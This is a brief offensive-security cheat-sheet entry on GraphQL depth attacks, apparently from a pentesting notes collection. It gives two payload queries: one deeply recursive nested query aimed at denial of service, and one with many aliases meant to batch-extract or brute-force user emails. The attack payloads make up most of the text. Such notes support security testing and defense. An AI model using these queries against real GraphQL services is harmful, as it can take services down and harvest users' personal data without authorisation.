# GraphQL Depth Attacks

## Summary
Exploit GraphQL query depth for DoS or data extraction.

## Techniques

### Deep Recursion
```graphql
query {
  user {
    posts { comments { user { posts { comments { ... } } } } }
  }
}
```

### Batching/Brute Force
```graphql
query {
  a: user(id:1) { email }
  b: user(id:2) { email }
  # ... 1000 aliases
}
```
